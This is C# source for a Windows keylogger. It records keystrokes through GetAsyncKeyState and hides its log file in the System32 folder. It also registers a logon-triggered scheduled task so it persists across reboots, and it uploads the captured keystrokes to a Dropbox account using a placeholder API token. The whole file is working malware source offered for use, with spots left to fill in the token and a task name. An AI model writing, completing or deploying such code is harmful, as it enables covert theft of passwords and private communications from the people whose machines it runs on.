using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Dropbox.Api;
using Dropbox.Api.Files;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static async void UploadToDropbox(string file)
        {
            using (var dbx = new DropboxClient("DROPBOX-API-TOKEN-HERE"))
            {
                var fileName = Path.GetFileName(file);
                using (var memStream = new MemoryStream(File.ReadAllBytes(file)))
                {
                    var updated = await dbx.Files.UploadAsync(
                        "/" + fileName,
                        WriteMode.Overwrite.Instance,
                        body: memStream);
                }
            }
        }

        static void Main(string[] args)
        {
            string filePath = @"C:\Windows\System32\logs.txt"; //Path to the log file... You can also rename the "log.txt" to whatever you want.

            if (!Directory.Exists(Path.GetDirectoryName(filePath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(filePath));
            }

            if (!File.Exists(filePath))
            {
                File.Create(filePath).Dispose();
            }

            // Add code to start keylogger on boot
            using (Microsoft.Win32.TaskScheduler.TaskService ts = new Microsoft.Win32.TaskScheduler.TaskService())
            {
                // Create a new task definition and assign properties
                Microsoft.Win32.TaskScheduler.TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "DESCRIPTION-GOES-HERE";
                td.Principal.LogonType = Microsoft.Win32.TaskScheduler.TaskLogonType.InteractiveToken;

                // Add a trigger that will start the task at login
                Microsoft.Win32.TaskScheduler.LogonTrigger lt = new Microsoft.Win32.TaskScheduler.LogonTrigger();
                td.Triggers.Add(lt);

                // Add an action that will run the keylogger
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                Microsoft.Win32.TaskScheduler.ExecAction action = new Microsoft.Win32.TaskScheduler.ExecAction(exePath);
                td.Actions.Add(action);

                // Register the task in the root folder
                ts.RootFolder.RegisterTaskDefinition("NAME-GOES-HERE", td);
            }

            while (true)
            {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        sb.Append((Keys)i + ", ");
                    }
                }

                if (sb.Length > 0)
                {
                    string data = sb.ToString();
                    data = data.Substring(0, data.Length - 2);
                    using (StreamWriter sw = File.AppendText(filePath))
                    {
                        sw.Write(data);
                    }

                    // Upload to Dropbox
                    UploadToDropbox(filePath);
                }

                Thread.Sleep(1800000); //Sleep for 30 minutes
            }
        }
    }
}
